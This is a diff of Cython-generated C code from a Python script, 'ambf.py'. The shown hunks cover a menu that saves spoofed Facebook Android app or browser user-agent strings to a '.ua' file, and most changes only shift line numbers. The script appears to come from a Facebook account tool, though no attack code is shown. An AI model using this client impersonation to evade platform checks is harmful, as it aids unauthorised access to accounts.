+    /* "ambf.py":577
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["5", "05"]:
  * 		c_ua = ("[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_menu); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 583, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_menu); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 577, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __pyx_t_3 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
@@ -18139,12 +17898,12 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 583, __pyx_L1_error)
+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 577, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":577
+    /* "ambf.py":571
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["4", "04"]:             # <<<<<<<<<<<<<<
@@ -18154,7 +17913,7 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":584
+  /* "ambf.py":578
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["5", "05"]:             # <<<<<<<<<<<<<<
@@ -18163,20 +17922,20 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_4 = __pyx_v_ua;
-  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_5, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 584, __pyx_L1_error)
+  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_5, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 578, __pyx_L1_error)
   if (!__pyx_t_5) {
   } else {
     __pyx_t_2 = __pyx_t_5;
     goto __pyx_L12_bool_binop_done;
   }
-  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_05, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 584, __pyx_L1_error)
+  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_05, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 578, __pyx_L1_error)
   __pyx_t_2 = __pyx_t_5;
   __pyx_L12_bool_binop_done:;
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
   __pyx_t_5 = (__pyx_t_2 != 0);
   if (__pyx_t_5) {
 
-    /* "ambf.py":585
+    /* "ambf.py":579
  * 		menu()
  * 	elif ua in ["5", "05"]:
  * 		c_ua = ("[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]")             # <<<<<<<<<<<<<<
@@ -18186,16 +17945,16 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_INCREF(__pyx_kp_s_FBAN_FB4A_FBAV_222_0_0_48_113_F);
     __pyx_v_c_ua = __pyx_kp_s_FBAN_FB4A_FBAV_222_0_0_48_113_F;
 
-    /* "ambf.py":586
+    /* "ambf.py":580
  * 	elif ua in ["5", "05"]:
  * 		c_ua = ("[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]")
  * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  */
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 586, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 580, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 586, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 580, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __pyx_t_1 = NULL;
@@ -18210,21 +17969,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_v_c_ua) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_c_ua);
     __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 586, __pyx_L1_error)
+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 580, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":587
+    /* "ambf.py":581
  * 		c_ua = ("[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]")
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 587, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 581, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_sleep); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 587, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_sleep); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 581, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -18239,21 +17998,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_int_1);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 587, __pyx_L1_error)
+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 581, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":588
+    /* "ambf.py":582
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 588, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 582, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_read); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 588, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_read); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 582, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __pyx_t_1 = NULL;
@@ -18268,34 +18027,34 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
     __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 588, __pyx_L1_error)
+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 582, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
-    __pyx_t_3 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 588, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 582, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (__Pyx_PrintOne(0, __pyx_t_3) < 0) __PYX_ERR(0, 588, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_3) < 0) __PYX_ERR(0, 582, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":589
+    /* "ambf.py":583
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["6", "06"]:
  */
-    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 589, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 583, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":590
+    /* "ambf.py":584
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["6", "06"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_menu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 590, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_menu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 584, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __pyx_t_1 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
@@ -18309,12 +18068,12 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
     __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 590, __pyx_L1_error)
+    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 584, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":584
+    /* "ambf.py":578
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["5", "05"]:             # <<<<<<<<<<<<<<
@@ -18324,7 +18083,7 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":591
+  /* "ambf.py":585
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["6", "06"]:             # <<<<<<<<<<<<<<
@@ -18333,20 +18092,20 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_3 = __pyx_v_ua;
-  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_6, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 591, __pyx_L1_error)
+  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_6, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 585, __pyx_L1_error)
   if (!__pyx_t_2) {
   } else {
     __pyx_t_5 = __pyx_t_2;
     goto __pyx_L14_bool_binop_done;
   }
-  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_06, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 591, __pyx_L1_error)
+  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_06, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 585, __pyx_L1_error)
   __pyx_t_5 = __pyx_t_2;
   __pyx_L14_bool_binop_done:;
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __pyx_t_2 = (__pyx_t_5 != 0);
   if (__pyx_t_2) {
 
-    /* "ambf.py":592
+    /* "ambf.py":586
  * 		menu()
  * 	elif ua in ["6", "06"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")             # <<<<<<<<<<<<<<
@@ -18356,16 +18115,16 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_9_CPH1);
     __pyx_v_c_ua = __pyx_kp_s_Mozilla_5_0_Linux_Android_9_CPH1;
 
-    /* "ambf.py":593
+    /* "ambf.py":587
  * 	elif ua in ["6", "06"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  */
-    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 593, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 587, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_write); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 593, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_write); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 587, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -18380,21 +18139,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_4, __pyx_v_c_ua) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_c_ua);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 593, __pyx_L1_error)
+    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 587, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":594
+    /* "ambf.py":588
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 594, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 588, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_sleep); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 594, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_sleep); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 588, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __pyx_t_1 = NULL;
@@ -18409,21 +18168,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_1, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_int_1);
     __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 594, __pyx_L1_error)
+    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 588, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":595
+    /* "ambf.py":589
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
-    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 595, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 589, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_read); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 595, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_read); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 589, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -18438,34 +18197,34 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 595, __pyx_L1_error)
+    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 589, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
-    __pyx_t_1 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 595, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 589, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 595, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 589, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":596
+    /* "ambf.py":590
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["7", "07"]:
  */
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 596, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 590, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":597
+    /* "ambf.py":591
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["7", "07"]:
  * 		c_ua = input(" [+] user-agent : ")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 597, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 591, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __pyx_t_4 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
@@ -18479,12 +18238,12 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 597, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 591, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":591
+    /* "ambf.py":585
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["6", "06"]:             # <<<<<<<<<<<<<<
@@ -18494,7 +18253,7 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":598
+  /* "ambf.py":592
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["7", "07"]:             # <<<<<<<<<<<<<<
@@ -18503,53 +18262,53 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
-  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_7, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 598, __pyx_L1_error)
+  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_7, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 592, __pyx_L1_error)
   if (!__pyx_t_5) {
   } else {
     __pyx_t_2 = __pyx_t_5;
     goto __pyx_L16_bool_binop_done;
   }
-  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_07, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 598, __pyx_L1_error)
+  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_07, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 592, __pyx_L1_error)
   __pyx_t_2 = __pyx_t_5;
   __pyx_L16_bool_binop_done:;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_t_5 = (__pyx_t_2 != 0);
   if (__pyx_t_5) {
 
-    /* "ambf.py":599
+    /* "ambf.py":593
  * 		menu()
  * 	elif ua in ["7", "07"]:
  * 		c_ua = input(" [+] user-agent : ")             # <<<<<<<<<<<<<<
  * 		if c_ua == "":
  * 			exit("\n [!] jangan kosong")
  */
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 599, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 593, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __pyx_v_c_ua = __pyx_t_1;
     __pyx_t_1 = 0;
 
-    /* "ambf.py":600
+    /* "ambf.py":594
  * 	elif ua in ["7", "07"]:
  * 		c_ua = input(" [+] user-agent : ")
  * 		if c_ua == "":             # <<<<<<<<<<<<<<
  * 			exit("\n [!] jangan kosong")
  * 		open(".ua", "w").write(c_ua)
  */
